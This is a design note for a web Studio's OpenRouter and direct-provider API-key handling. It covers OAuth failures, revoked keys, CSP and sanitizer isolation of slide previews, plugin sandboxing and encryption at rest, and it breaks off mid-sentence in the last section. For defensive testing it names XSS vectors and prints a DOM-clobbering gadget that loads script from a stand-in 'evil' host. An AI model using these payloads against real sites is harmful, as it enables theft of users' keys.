---
status: shipped
summary: The Studio's bring-your-own-key (BYOK) OpenRouter key had three silent failure points — a failed OAuth return said nothing, a revoked key was never noticed, and nothing proved a shared deck's preview could not read the key. Each is now handled and tested, one module names the key, a real-browser spec proves the slide sanitizer keeps a hostile deck from reading it, and a live run on a real key found and fixed a finish faculty that never worked (#610).
---

# Studio BYOK — the key's lifecycle, end to end

The Studio runs on the author's own OpenRouter key (BYOK, "bring your own key"). The
key arrives through an OAuth sign-in (PKCE: the page stores a one-time *verifier*,
OpenRouter returns a one-time *code*, and the two are exchanged for a key), lives in
`localStorage` under `lattice-db-or-key`, and is spent by every AI surface. This note
covers what happens at each stage when something goes wrong.

## 1. Sign-in: a failed return says so

**Before.** `resumePendingAuth` (`docs/src/components/studio/architect.ts`) returned
`false` when the code-for-key exchange failed. The Studio read `false` as "nothing to
resume", so the author clicked Connect, signed in at OpenRouter, came back, and saw
nothing. The PKCE verifier stayed in storage, so every later load still looked like a
pending sign-in, and that verifier could never succeed again.

**Now.** `resumePendingAuth` returns `{ status: 'none' | 'connected' }` or
`{ status: 'failed', note }`:

- A non-2xx from `POST /api/v1/auth/keys` (OpenRouter answered and refused): the adapter's
  `resumeOpenRouterAuth` (`ai/architect-model.js`) clears the verifier and rethrows;
  `resumePendingAuth` scrubs `?code=` from the URL so a reload cannot replay the dead
  exchange, and returns `failed` with the HTTP status and `retry: 'connect'`.
- A network failure (OpenRouter never answered): the code was never spent, so the verifier
  and the code both stay, and the result is `failed` with `retry: 'reload'`. A reload
  finishes the sign-in.
- `resumePendingAuth` is single-flight. React StrictMode runs the mount effect twice in
  development, and two exchanges of one single-use code would make one of them report a
  false failure after a sign-in that worked.
- A return with `?error=` and no code (the author cancelled, or OpenRouter refused):
  the verifier is cleared and the result is `failed`.
- `StudioShell` shows `failed` as an action notice: **Try again** starts a fresh sign-in,
  **Reload** retries the unspent code.

An existing key is never touched by a failed exchange: only the verifier is cleared.

Pinned by `architect.test.ts` › "resumePendingAuth — a failed OAuth return says so"
and `docs/e2e/openrouter-oauth-return.spec.ts` (mocked endpoint, HARD RULE #24).

## 2. A revoked key is noticed

**Before.** Nothing read a 401 as "this key is dead". An author who revoked the key on
openrouter.ai, or whose key expired, kept seeing "OpenRouter — active" in Workspace; every
cloud request failed, and nothing offered the fix.

**Now.** Every call made with the stored key feeds its status to `noteOpenRouterStatus(status,
key)` in `docs/src/lib/openrouter-key.js`: the adapter's `/auth/key` and `/chat/completions`
calls, and the voice model's `/audio/speech` (`docs/src/playground/voice-model.js`). A **401**
sets `lattice-db-or-key-invalid`; a later **2xx** with the same key clears it, so a one-off 401
does not stick; each change fires `db-model-changed` once so live surfaces re-read. `availability().openRouterKeyInvalid` carries it to
`useArchitectStatus`, and the Workspace AI tab replaces the connected row with
"OpenRouter — key rejected · Reconnect".

Three choices worth recording:

- **The key stays.** Deleting it would drop the author to "not connected", which hides
  what happened. The row says the key was rejected; the requests themselves still name
  the 401 (`describeModelError`, `model-error.ts`).
- **Only 401.** A 402 is an empty wallet, a 429 is a rate limit, and OpenRouter uses 403
  for moderation as well as auth. None of those mean the key is dead.
- **Every write of the key clears the mark** (`setKey` in the backend), so a reconnect, a
  disconnect, or the Disconnect Undo's `restore` always starts clean.
- **An answer about an old key is ignored.** The status is recorded only when the key the
  request carried is still the stored key. Without that, a `/auth/key` 401 still in flight
  when the author reconnected would land after the reconnect and mark the NEW key rejected
  (found by review, pinned by a unit test).
- **`/credits` is not tapped.** OpenRouter documents it as needing a management key, so a
  refusal there does not prove the key is dead.

The Studio's `useArchitectStatus` already fetches `/auth/key` when the Workspace opens, so
a revoked key is caught there before any paid request is attempted.

Pinned by `ai/architect-model.key-invalid.test.ts` (the mark, its one-time announcement,
the stale-key race, `/credits`, that 402/429/500 do not set it, and that a disconnect clears
it), `lib/openrouter-key.test.ts` and
`WorkspaceSheet.test.tsx` › "a rejected key".

## 3. One module reads the key

**Before.** Four app modules named `lattice-db-or-key` and read it themselves: the model
adapter (`ai/architect-model.js`), the Studio read-aloud (`read-aloud.ts`), and the inline
scripts of the `/libraries/suono` and `/libraries/cadenza` pages. Answering "what can read
the author's key?" meant a repo-wide grep and trust that nobody had spelled it differently.

**Now.** `docs/src/lib/openrouter-key.js` is the only file under `docs/src` that names the
key. It exports `readOpenRouterKey`, `writeOpenRouterKey` (which also clears the rejected
mark from §2), `openRouterKeyRejected`, `markOpenRouterKeyRejected` and
`isOpenRouterKeyEvent` (for another tab's `storage` event). The four callers import it.

`docs/src/lib/openrouter-key.test.ts` runs `git grep --untracked` over `docs/src` and fails
if any non-test file other than this module names the key. Tests may seed it by name; the
test harnesses under `tools/` and `docs/e2e/` that inject a key into a headless browser are
outside `docs/src` and are not app code.

Measured: on `main`, `git grep -l lattice-db-or-key -- docs/src` lists 4 non-test files;
on this branch it lists 1.

Not readers, and pinned so: every code path that sweeps storage (found by `localStorage.key(`:
the storage meter `scanLocalStorage`, `storageSummary`, `deckContentStats`, the workspace
backup) reports key names and byte counts, never values. `openrouter-key.test.ts` › "no storage
sweep returns the key value" seeds a canary and checks all three outputs (red when the meter is
made to leak a value); `workspace-backup.test.ts` › "never packs the OpenRouter key, even if
present" pins the backup.

The shipped bundle names the key in one chunk, `openrouter-key.*.js` (measured on the built
site, 2026-11-06). A post-build check that keeps it that way is a new CI step and so waits on
the owner (`followups.d/3048-p4-key-name-in-one-shipped-chunk.md`).

## 4. A shared deck cannot read the key

**The exposure.** The Studio's slide preview is a same-origin, unsandboxed `srcdoc` iframe
(`docs/src/playground/single-slide-render.ts`, `srcdoc()`), and its CSP
(`lib/core/subresource-csp.mjs`) had **no `script-src`** when this section was first written: it
closed `img-src`, `connect-src`, `object-src`, `base-uri` and `form-action` against data beacons,
and left script loading unrestricted (the second wall below changes that for this frame). Same origin means a script in the frame shares the Studio's
`localStorage`, which is where the key lives. Closing `connect-src` does not save it: the
script can call `parent.fetch` (the parent's realm, without the frame's CSP) or set
`top.location` to a URL carrying the key.

So the guard is exactly one thing: `sanitizeSlideHtml` (`docs/src/lib/sanitize-slide-html.js`,
DOMPurify), which `srcdoc()` applies to every slide through `sanitizeOnce` before the markup
enters the frame. HARD RULE #22 already gates that the builder calls it
(`checkPreviewHtmlSinks`).

§3 does **not** add to this defense. It makes our own code auditable, but an injected script
does not need our module: it types `localStorage.getItem(…)` itself. The key's safety in the
preview rests on one sanitizer call. The stronger, defense-in-depth move was a `script-src` in
the frame's CSP that refuses inline event handlers, which are the vectors that fired
unguarded below. It shipped as the second wall, below.

**The proof.** `docs/e2e/byok-key-isolation.spec.ts` seeds a canary key, types a deck
carrying nine script vectors (`<script>`, `img onerror` with a beacon, `svg onload`,
`<svg><script>`, `details ontoggle`, `iframe srcdoc`, an `onerror` after a `<style>`,
`object data="javascript:"`, and, last because it swallows what follows, an mXSS
`math/mglyph/style` nest), confirms the slide rendered,
and asserts that none of them read the key or reached the beacon host.

**The proof can fail.** With `sanitizeOnce` changed to `return html;` and the site rebuilt,
the same spec goes red, and four vectors read the canary:

```
+ "details-ontoggle:sk-or-e2e-isolation-canary",
+ "iframe-srcdoc:sk-or-e2e-isolation-canary",
+ "after-style:sk-or-e2e-isolation-canary",
+ "img-onerror:sk-or-e2e-isolation-canary",
```

(Measured 2026-11-06, desktop Chromium. A bare `<script>` and `<svg onload>` did not fire
even unguarded, because markup inserted through the preview's patch paths does not run
`<script>` elements; the guard is what stops the event-handler vectors, which do.)

**The second wall: a `script-src` (#3048-p5, 2026-11-06).** The Studio preview frame now
carries `script-src 'nonce-<n>' 'strict-dynamic' <site origin>` in its CSP. `preview-csp.js`
makes one random nonce per page load (`PAGE_SCRIPT_NONCE`, 18 bytes), and `single-slide-render.ts`
stamps it on every script `srcdoc()` writes: the font gate, dagre, the runtime, the link guard, and the drawn
libraries' preloads. The browser then refuses any inline event handler, `javascript:` URL, or
`<script>` the parser meets without that nonce, whatever the sanitizer let through.
`'strict-dynamic'` trusts what those scripts insert with `createElement('script')` (the runtime's
dagre, plugin data and drawn-library loads), so no library URL is listed. The origin is a fallback
for a browser without `'strict-dynamic'`, which ignores it otherwise. There is no `'unsafe-inline'`.
There IS `'unsafe-eval'`: function-plot's library compiles with `new Function`, and the runtime loads
it into this frame when the draw host's sandbox is down (`host-browser.mjs`, found by the checker).
It lets a running script call eval; it does not let markup run.

Three things the adversarial trio found, all fixed in this PR:

- **A DOM-clobbering gadget (red team, HIGH).** The runtime took its own URL from
  `document.currentScript`, which a named element can override:
  `<img name="currentScript" src="https://evil/x/lattice-runtime.js">`. It then built
  `lattice-plugin-icons.js` and dagre URLs from it and inserted them with `createElement`, which
  `'strict-dynamic'` trusts. Reproduced in Chromium, Gecko and WebKit on markup the sanitizer had
  been bypassed for. `lib/runtime/index.js` now accepts only a real `HTMLScriptElement`; the same
  harness then loads nothing in any of the three.
- **The nonce is not hidden.** Browsers hide `nonce` from CSS and `getAttribute` only under a policy
  sent as an HTTP header, and this one is a `<meta>`. Author CSS that can reach an image host the
  reader allowed could leak it, and it is the same for every frame in one page load, so it would
  help a LATER injection in that page load. The code comment that claimed otherwise is corrected.
  A nonce per document would close it, but the render signatures depend on rewrites of the same
  slide being byte-identical; recorded in `followups.d/3048-p10-…`.
- **function-plot's eval**, above.

The policy is opt-in in `lib/core/subresource-csp.mjs` (`scriptSources`, reached by passing
`scriptNonce`). Without a nonce the policy has no `script-src`, as before, so the CLI export and the
other preview builders (Print, the deck preview) are unchanged until each one stamps its own
scripts.

**The Stage joined on 2026-11-08 (3048-p10).** `buildStageDoc` passes the same page nonce and stamps
its five scripts (font gate, dagre, runtime, reveal, fit) and the drawn libraries' preloads. One nonce
serves both frames; within a page load that adds nothing, since every preview frame already shared one.
A per-DOCUMENT nonce would break the Stage: `paint()` rewrites it with `document.open()`/`write()`, a
`<meta>` policy stays on the window across that, so a second document's scripts would meet the first
document's nonce as well. Keep the Stage's nonce per page unless the rewrite becomes a fresh window.

Measured, 2026-11-06:

- **It holds alone.** Built with `sanitizeOnce` returning its input, `byok-key-isolation.spec.ts`
  stays green on desktop and mobile Chromium, Gecko, and WebKit phone and tablet. A scratch probe on
  the same build found the `ontoggle` and `onerror` handlers in the frame's DOM, neither ran, and
  Chromium logged "Refused to execute inline event handler because it violates … script-src
  'nonce-…' 'strict-dynamic'". Without the `script-src` (before this change), the same arm read the
  key through four vectors (above).
- **It breaks nothing found.** One gallery slide of each of 59 kinds (Mermaid, flowcharts, state
  charts, KaTeX, every chart family, code) rendered in the Studio preview with zero CSP refusals in
  the console. The probe does see refusals: it caught the two above. The desktop `@smoke` suite
  (152 tests) passed with the policy in place.

Pinned by `test/unit/core/subresource-csp-script-nonce.test.js` (the directive, no unsafe
keywords, a malformed nonce or origin refused, no change without a nonce) and by
`byok-key-isolation.spec.ts`, which now also asserts the frame's policy carries the nonce.

**The other six surfaces (#3048-p5, 2026-11-06).** The adversarial pass below TRACED six more
surfaces that render a deck on the key's origin to a sanitizer call. Each is now PROVED in a browser
by `docs/e2e/byok-key-isolation-surfaces.spec.ts`, which renders the same hostile deck
(`docs/e2e/hostile-deck.ts`, shared with the Studio-preview spec) on the surface with a canary key
seeded, checks the deck really rendered there, waits for the signal the handlers ride on, and asserts
nothing ran and no beacon left. The Library gets a hostile motion package instead of a deck.

The red arm: one build with every one of these sanitizer calls returning its input. Each test went
red, and the vectors that read the key were:

| Surface | Sanitizer call removed | Vectors that ran |
|---|---|---|
| Read Article | `article-projection.ts` (`sanitize` in `projectSectionsToArticle`) | `<script>`, `<svg><script>`, `details ontoggle`, `iframe srcdoc` |
| Stage popup | `stage-window.js` `buildStageDoc` | `img onerror`, the onerror after a `<style>`, the mXSS nest |
| PDF export (capture frame) | `deck-preview.js` `buildSrcdoc` | `<script>`, `<svg><script>`, `details ontoggle`, `img onerror`, after-style, `iframe srcdoc`, `svg onload` |
| Print deck (print sheets, "Download PDF") | `deck-preview.js` `buildSrcdoc` | 12 leak entries |
| Webpage export (prune frame) | `buildSrcdoc`, and `assemblePlayer`'s `sanitize` cap (`share-export.ts`) | `<script>`, `<svg><script>`, `details ontoggle`, `iframe srcdoc`, `svg onload` |
| Library scene art | `sanitizeSceneAssets` (`scene-library.ts`) | SVG `<image onerror>`, `foreignObject` `img onerror` and `details ontoggle` |

So on each of these six the sanitizer was the ONLY wall: none carried the `script-src` the
Studio preview has. The Stage now does (above); on the other five the sanitizer is still the only wall. Giving each its own nonce is the next defense-in-depth step, and the
specs above are what would prove it (`followups.d/3048-p10-nonce-script-src-on-other-surfaces.md`).

Two things the specs taught. Print's options step shows a Studio preview frame (single-slide-render,
already covered), not the print document; the print sheets are built only on Print or "Download
PDF", so the spec drives the download. The Stage resolves `src="x"` against a document with no
base, so its images neither load nor fail; the spec waits for the popup's `load` event instead.

Green, with the sanitizers in place, on desktop Chromium, Gecko and WebKit (iPad landscape), all
measured 2026-11-06. The spec is tagged to run on desktop Chromium and Gecko; WebKit was a one-time
run (the desktop project drops a test tagged `@webkit` unless it is also `@crosswidth`, and these
cannot run at phone width). The red arm was measured on desktop Chromium only. Not run at phone width: the phone Studio has no
posture dial or Stage, as the existing Read Article and Stage specs also reflect.

## 5. The adversarial pass (2026-11-06)

A red team, a Munger inversion and an independent checker reviewed §1–§4.

- **Red team: no exploitable path found.** 21 mXSS payloads through the repo's exact DOMPurify
  config, each re-inserted three ways; Mermaid 11 `%%{init}%%` attempts to loosen
  `securityLevel`; function-plot's expression compiler; the style channel; and the suono and
  cadenza pages. One **latent** sink, fixed here: `chart-interact.js`'s vanilla popover wrote a
  mark's `data-label`/`data-value` into the PARENT document with `innerHTML`, and DOMPurify
  keeps `data-*` attributes verbatim. No caller reached that branch (the Studio always passes
  `onDetail`), but the first host that dropped it would have handed a deck script the key's
  realm. The three text values are now escaped, pinned by `chart-interact.test.ts` (red with
  the escape removed).
- **Checker: two confirmed bugs, fixed here.** The stale-key 401 race (§2) and a guard test
  that passed when git failed to run (§3). Also fixed: StrictMode's double code exchange and
  the network-blip case (§1), the one-off 401 that stuck (§2), on-device failures worded as
  OpenRouter errors (`surfaceErrors` now lifts cloud failures only), and two spec payloads the
  mXSS nest had swallowed (§4).
- **Inversion: the §3-protects-§4 claim was wrong**, corrected above.

Deferred, each with a follow-up file: a frame `script-src` that refuses inline handlers
(defense in depth for §4); browser proof on the other same-origin surfaces; and a post-build check that the key's name
stays in one shipped chunk (blocked on a CI-step decision).

## 6. Live run on a real model (2026-11-06)

Every AI test in the repo runs on fake replies (#1791). This run drove the built Studio in
headless Chromium on a real OpenRouter key, from a throwaway harness in `.scratch/` (HARD RULE
#24: on-demand, never per-PR; the key was read from the environment and injected only into the
browser's storage). Total spend, measured by the key's own `usage_monthly`: **$0.156**.

| Surface | Model | Result | Cost |
|---|---|---|---|
| Theme — "describe a look" | Haiku (latest) | "Generated a full palette — every pair passes AA." | $0.0003 |
| Theme | Sonnet (latest) | same | $0.0025 |
| Component — "describe a component" | Haiku | `.pricing-tiers`, 1 design round, gate-clean | $0.0036 |
| Component | Sonnet | `.quarter-track`, 1 design round, gate-clean | $0.0682 |
| Finish — "describe a finish" | Haiku | **failed before the fix** ("no usable finish recipe"); after: recipe generated, twice | $0.0003 |
| Finish | Sonnet | recipe generated | $0.0038 |
| Motion — "describe a drawing" | Haiku / Sonnet | "Drew it" | $0.0007 / $0.0088 |
| Voice — `/audio/speech` (Kokoro, via Workspace → Play sample at 1.05×) | catalog default | 200, `audio/mpeg`, 14,040 B, 2.11 s, mean −26.8 dB | (in total) |
| Theme with a never-issued key | Haiku | 401 → Workspace shows "key rejected · Reconnect" | $0 |

**The finish faculty never worked on a real model.** `generateFinish` asks the adapter for
`json: true`, which returns the already-parsed object; `parseFinishReply` read only strings, so
it saw `"[object Object]"` and found no JSON. Haiku's replies were well-formed and in
vocabulary. `parseFinishReply` now accepts the object, and `architect.test.ts` › "generateFinish
— a real JSON reply survives the adapter" drives the real adapter (red before the fix). Finish
and motion also now name a failed request the way theme and component do (the 2026-11-06
bullet in `2026-06-29-studio-theme-ai.md`).

**Not verified live:**
- **A 402.** Producing one means sending a request too big for the key's remaining limit. If
  OpenRouter accepted it instead of refusing, it would spend real money, so this run did not
  try. The 402 sentence is pinned on a mocked endpoint
  (`docs/e2e/fabricate-model-error.spec.ts`) and in unit tests. **UNVERIFIED** against the
  real service.
- **How the voice sounds.** The clip is real synthesis at speech-level energy, but no person
  has listened to it. Time-to-first-audio and the narrated-Present claims of #1398 were not
  measured.
- **#1791's matrix.** This run is one prompt per cell, not the frozen prompt set, repeats or
  committed baseline that #1791 asks for, so #1791 stays open.

## 7. Bring your own key: a pasted key, then direct providers

**Asked (owner, 2026-11-06):** a UI to supply your own API key, for OpenRouter and directly for
OpenAI, Anthropic and Gemini, with OpenRouter as the default.

**Decided, in one round:**
1. **Ship a pasted OpenRouter key first**, then the direct providers in a separate PR behind
   one provider adapter.
2. **A third tab** in Workspace → AI: **Cloud · On-device · API key**.
3. **For a direct provider that cannot report a balance**, the Spend tab shows this session's
   cost from token counts and a price table we keep, labeled as an estimate, plus "Balance not
   available for this provider" with a link to its billing page.

**Shipped here (step 1).** `ApiKeyPanel.tsx` takes a pasted key; `saveOpenRouterKey`
(`architect.ts`) refuses anything not shaped `sk-or-…` without a request, checks the rest with
OpenRouter's `/auth/key` (the adapter's `checkOpenRouterKey`, read-only and free), and stores it
only on a 200, through `lib/openrouter-key.js`. A saved key shows as `…` plus its last four
characters (`openRouterKeyHint`), with Replace and Remove. Saving a key also makes Cloud the active tier
(`setStudioTier('auto')`): the Studio lets an explicit on-device pick outrank the cloud, so
without it a saved key sat behind an on-device tier while the toast said Cloud was active. The
pasted text loses every whitespace and zero-width character before the shape check, since a key
copied from a chat or a PDF can carry one and `fetch` refuses it in a header. The field asks
password managers not to store it (`autocomplete="new-password"` and their opt-out
attributes). These three came from an independent checker pass on the pasted-key flow. "API key" is a way to CONNECT the cloud
tier, not a third backend, so everything below the switch (spend, standing instructions, the
voice) treats it as Cloud. Pinned by `architect.test.ts` › "saveOpenRouterKey",
`WorkspaceSheet.test.tsx` › "the API key tab", and `docs/e2e/workspace-api-key.spec.ts`.

**Shipped (step 2): direct OpenAI, Anthropic and Gemini keys.** The API key tab has a provider
picker (OpenRouter, OpenAI, Anthropic, Gemini; OpenRouter first and the default) and a list of
the keys this browser holds, each with Use, Replace and Remove. One provider runs the cloud tier
at a time; saving a key makes its provider the one in use, and removing the active direct key
returns the tier to OpenRouter.

- **Keys.** `lib/openrouter-key.js` holds one sealed slot per provider (`lattice-db-or-key`,
  `lattice-db-openai-key`, `lattice-db-gemini-key`, `lattice-db-anthropic-key`), each with its
  own rejected mark, all sealed under the one AES-GCM key from §9. It also stores which provider
  is in use (`lattice-db-provider`). It is still the only file under `docs/src` that names any of
  them, so §3's one-reader property holds for all four. The OpenRouter API every caller used is
  unchanged.
- **Check before store.** `saveProviderKey` (`api-key.ts`) refuses a key of the wrong shape
  without a request, and says which provider a misplaced key belongs to ("That looks like an
  Anthropic key"). It then asks the provider's free model listing (`GET /models`) and stores the
  key only on a 200.
- **Transports** (`ai/direct-providers.js`). OpenAI and Gemini take the OpenRouter request at
  their own base URL (Gemini through its OpenAI-compatible endpoint). Two differences matter:
  OpenAI's newer models refuse `max_tokens` and take `max_completion_tokens`, and OpenRouter's
  `cache_control` marks are removed because both providers cache on their own. Anthropic gets
  its own transport: system messages lift into `system`, `tool_calls` become `tool_use` blocks,
  tool results merge into one user turn, the stream's events map back onto the same callbacks
  (`max_tokens` → `length`), and every request carries
  `anthropic-dangerous-direct-browser-access: true`, without which Anthropic refuses a browser.
  It marks the first system block for caching unless the author turned caching off, as
  `or-cache.js` does for Anthropic models on OpenRouter.
- **One cloud tier.** `architect-model.js` asks `cloud()` for the backend: OpenRouter, unless the
  chosen direct provider holds a key. The direct backend has the OpenRouter backend's shape and
  reports the Studio's tier name `openrouter`, so every faculty, the budget gate and the spend
  ledger work unchanged. `availability().provider` says which provider it is.
- **Spend is an estimate (decision 3).** Token counts × the model's price. The price comes from
  OpenRouter's PUBLIC model catalog (no key; the picker already fetches it), which lists these
  providers' models at their own rates. We chose that over a committed price table because the
  ids moved too fast for one: on 2026-11-06 the catalog listed `gpt-6.1-terra`,
  `claude-sonnet-5.5` and `gemini-3.8-flash`, none of which a table written months earlier would
  have priced. Direct ids map onto catalog ids (`claude-sonnet-5-5-20260928` →
  `anthropic/claude-sonnet-5.5`). A model the catalog does not list gets no estimate, never a
  guessed one, and every usage the transport reports carries `estimated: true`. The Spend tab
  shows "Balance not available for this provider", a link to the provider's billing page, and
  "This session · estimate"; the per-key cap row (an OpenRouter feature) is hidden.
- **An unpriced model fails closed.** OpenRouter reports each call's real cost and can cap a key on
  its server; a direct key often has neither, so the estimate is the only limit. A model the
  catalog cannot price (or every model, when openrouter.ai is unreachable) would otherwise be
  recorded as $0 and never trip the cap. So under a hard-stop cap, `cloudBudgetBlock` refuses a call
  on a direct key with no price, and the Spend tab says the model's calls are not counted. Warn mode
  and OpenRouter are unchanged. Found by the inversion pass; pinned in `architect.test.ts`.
- **Models.** The picker lists the provider's own `/models`, minus embedding, image and audio
  models, priced from the catalog. Until the author picks one, the default (`pickDefaultModel`) is
  the newest model the catalog prices at $10 or less per million output tokens, outside the side
  tiers (pro, mini, lite, preview, opus and the like, matched as whole words: a bare `mini` once
  matched inside "gemini"). Failing that, the CHEAPEST priced model, so a fallback never moves the
  author up in price; with no prices at all, the newest of the provider's everyday family (Sonnet,
  Flash, GPT). It is derived rather than pinned, for the same reason as the price.
- **A rejected key.** A 401 marks that provider's key (§2's rules, per slot). The Workspace says
  "<Provider> — key rejected" and offers **Replace key** (there is no OAuth to reconnect with),
  and `describeModelError` names the provider: "Anthropic rejected the key — replace it in
  Workspace → AI → API key", "Your OpenAI account is out of credits".
- **Privacy & Data.** "AI keys" (formerly "OpenRouter credentials") and Delete everything remove
  every provider's key (`disconnectAllProviders`).

**Found by the adversarial trio and fixed here:**

- **Photo description** used the OpenRouter image-model pick, which names nothing on a direct key,
  so it always answered "this model can't see pictures". On a direct key it now uses the author's
  model on that provider (`suggest-photo-description.ts`).
- **The model picker** opened on the Featured lens, which matches OpenRouter ids, so a direct
  provider's list showed empty. A direct provider opens on All with no lens row, and the search
  field names the provider. A list that answers after the provider changed is dropped.
- **Gemini** answers a bad or revoked key with 400 `API_KEY_INVALID`, not 401. Read as 401, so the
  save path says "rejected" and the §2 mark is set.
- **No reasoning or thinking on a direct key.** A non-reasoning OpenAI model refuses
  `reasoning_effort` with a 400, and Anthropic refuses a tool round whose thinking blocks were not
  passed back. This transport does not carry them, so it never asks.
- **A price of $0, or a row missing a price, is no price** (`usablePrice`): the provider still
  bills the direct call, and a $0 would pass the hard-stop cap.
- **The chosen provider stays the cloud tier** while its sealed key is re-opened (after another
  tab changes it). It reads not-ready for that moment rather than falling through to OpenRouter,
  which would bill the wrong account.

**Not verified, and why the live run matters.** The mocks answer in shapes we wrote, so a provider
that refuses one of our fields would pass the suite. A dispatch-only live smoke test per provider
(HARD RULE #24's sanctioned-workflow pattern) would catch that; it is a new CI workflow, so it is
the owner's call.

**Not in step 2.** The cloud voice stays on OpenRouter: OpenAI is the only direct provider with
speech, and it needs its own transport in `voice-model.js`
(`followups.d/3048-p9-direct-openai-voice.md`). OpenRouter-only extras do not carry over: the
file-parser plugin for a reference PDF, the authoritative cost of an aborted turn, and the
self-heal of a retired model id.

**Pinned by** `ai/direct-providers.test.ts` (the request shapes, both streams, the price lookup,
the default model, a 401, routing, sealing, remove-all) and `docs/e2e/byok-direct-providers.spec.ts`
(per provider: a wrong-shape key, a refused key, a saved and sealed key, the Spend lines, then
Theme, Finish and Motion succeed and Component's 402 names the provider, with every request on the
provider's endpoint and key and none on OpenRouter's; plus switching with Use and Remove).

**Live run: Anthropic verified by the owner; OpenAI and Gemini UNVERIFIED.** On 2026-11-06 the
owner pasted their own Anthropic key into the PR's deployed preview (Cloudflare Pages, production
build) and reported that it worked. The key never entered this repo's sandbox, which cannot store a
key for Anthropic's hosts. The owner declined OpenAI and Gemini keys for now
(`followups.d/3058-p1-live-provider-run.md`). Before that, this session had no provider key, so no
request reached a real provider. Three things only a live run can confirm: that each provider still
accepts browser (CORS) requests on these endpoints, that the price mapping finds the real ids,
and that the four faculties' replies parse. The brief asks for one under $1 total.

## 8. Plugins cannot read the key

**Asked (owner, 2026-11-06):** make sure plugins, third-party plugins and what they can
contribute cannot extract the key.

**Where each kind of plugin code runs in the browser, and why none reaches the key:**

| Plugin code | Where it runs | Why it cannot read the key |
|---|---|---|
| A third-party **code package** (`transform.js` from an imported zip) or a zip **plugin** fence/inline renderer | a worker inside `<iframe sandbox="allow-scripts">`, no `allow-same-origin` (`docs/src/lib/code-packages/runner.ts`), under a hash-pinned `default-src 'none'` policy | Two walls. The frame's origin is opaque, so nothing in it shares the Studio's storage; and the code runs in a WORKER, which has no `localStorage`, no DOM, no `parent`, `top` or `opener`. It runs only after the author approves its SHA-256 in this browser. |
| What such code **returns** (markup, and the `contributes.returns` data fields) | the door sanitizes it (`sanitizeSlideHtml` + `doorFinish`), then the preview frame sanitizes it again (§4) | An event handler or script it smuggles in is stripped twice before it reaches a same-origin frame. |
| A **first-party** plugin's drawing library (Mermaid and similar) in the Studio's previews | the draw host's sandboxed frames (`draw-host.ts`), each library pinned by SHA-256 | Opaque origin, as above. |
| A first-party plugin's `hydrate` script on surfaces with no draw host (Stage, Print, export) | the deck's own document | First-party, pinned, and named as exceptions to migrate (`followups.d/2749-p3-migrate-in-tree-plugins-to-sandbox-model.md`); not third-party code. |
| An **npm** plugin | nowhere in the browser: v1 loads npm plugins only in the CLI's locked page (`2026-10-16-npm-plugin-threat-model.md` §6, decisions 3 and 4) | The Studio never runs one. |

**The parent never answers a request.** The Studio's listeners for these frames
(`runner.ts`, `draw-host.ts`) accept only a result for a job the Studio started (a string,
length-capped) and ignore everything else, so there is no message a plugin can send to ask for
data. What the Studio sends in is the slide's markup, its plain facts, or a fence's text.

**The proof.** `docs/e2e/byok-plugin-isolation.spec.ts` seeds a canary key, imports a hostile
code package through the real Library, approves it, and has it probe from inside its realm
(`localStorage`, `sessionStorage`, `parent`/`top`/`opener` storage, `document.cookie`, IndexedDB,
Cache Storage, its own origin) and smuggle handler payloads into its output. Measured 2026-11-06
on desktop Chromium, Gecko and WebKit (iPad landscape), identically:

```
{"local":"refused","session":"refused","parent":"refused","top":"refused","opener":"refused",
 "cookie":"refused","idb":"refused","caches":"refused","origin":"null"}
```

No smuggled handler ran and the canary appears nowhere in the preview. The CONTROL runs the same
probe in the Studio page and reads the canary, so a probe blind to storage cannot pass.

**The proof can fail.** With the package frame given `allow-same-origin` and the site rebuilt,
the spec goes red: the package's origin reads `http://localhost:4321`, not `null`. In that red run
the key was still refused, because the worker wall held on its own. That is the point of having
two walls; the spec watches the outer one so losing it is caught before the inner one is all
that is left.

`code-packages.spec.ts` already proves the same packages reach no network (about fifteen exits,
against a real loopback server). Static, for in-tree plugin code: the purity gate in
`tools/check-ownership.js` (`PURITY_NAMES`, over `lib/plugins`, `lib/components`, `lib/runtime`)
fires on `localStorage`, `fetch`, the key's name and the other network and storage names. It is
a tripwire for an honest contributor, not a defense: a built name such as `globalThis['fe'+'tch']`
passes it. The sandbox is the defense; the gate only keeps first-party code from drifting.

**Not covered:** WebKit iPhone (the package import flow is driven on the iPad project, as the
existing code-package spec does); the desktop app, which is not built; and a browser exploit that
escapes a sandboxed frame (`2026-10-16-npm-plugin-threat-model.md` §5.3).

## 9. The key is encrypted at rest

**Asked (owner, 2026-11-06),** answering the CodeQL alert "clear text storage of sensitive
information" on `openrouter-key.js`: encrypt the key before merge, rather than dismiss the alert.

**Now.** `localStorage` holds an envelope, `v1:<iv>:<ciphertext>`, sealed with AES-GCM-256 under
a **non-extractable** WebCrypto key kept in IndexedDB (`lattice-secrets` → `keys` →
`openrouter-at-rest`). The browser can use that key; no code can read its bytes
(`crypto.subtle.exportKey` refuses). `loadOpenRouterKey` opens the envelope once into memory, so
every reader stays synchronous; the model adapter (`architect.ts` → `architectModel`) and the two
library pages await it before their first read. A plaintext key stored before this change is used
and re-sealed in place. An envelope whose sealing key is gone (the site's IndexedDB was cleared)
reads as no key and is removed, so the author connects again. Where WebCrypto or IndexedDB is
missing, a key the author saves stays in memory only, never written in clear.

**Three races an independent checker reproduced in the first version, all fixed and pinned:**
two seals starting together each made a sealing key and the second overwrote the first, so the
stored envelope could never open again (the lookup is now memoized, and a new key is written with
`add` so a second tab adopts the first tab's key); a transient IndexedDB failure while opening was
treated like a lost key and deleted the stored envelope (now only a database that opened and holds
no sealing key, or AES-GCM refusing the data, counts as gone; anything else keeps the envelope for
a later load); and a load still decrypting could put an older key back over a newer write (a write
generation counter now decides). The IndexedDB helper also settles on a transaction abort, which
used to leave it pending forever.

**What it protects, and what it does not.**

- **Protects:** the browser profile's files on disk. A backup of the profile, a synced profile
  folder, or another program reading those files gets an envelope and a key it cannot export.
- **Does not protect against script running on this origin.** Such a script can do what
  `openrouter-key.js` does: fetch the sealing key from IndexedDB and ask the browser to decrypt.
  `docs/e2e/openrouter-key-helper.ts` does exactly that, and the isolation specs use it as their
  control. The defenses there are still the sanitizer (§4) and the plugin sandbox (§8).

**Pinned by** `openrouter-key.test.ts` › "encrypted at rest" (the envelope never contains the
key; a reload opens it; a plaintext key is migrated; a lost sealing key reads as none; the
sealing key cannot be exported; no IndexedDB means memory only), and
`docs/e2e/workspace-api-key.spec.ts` (a saved key is stored sealed, opens to the key, and a page
reload shows it again), on desktop Chromium, mobile Chromium and WebKit iPhone.

**Reverting this is not a plain revert.** Once deployed, the first load re-seals every stored key
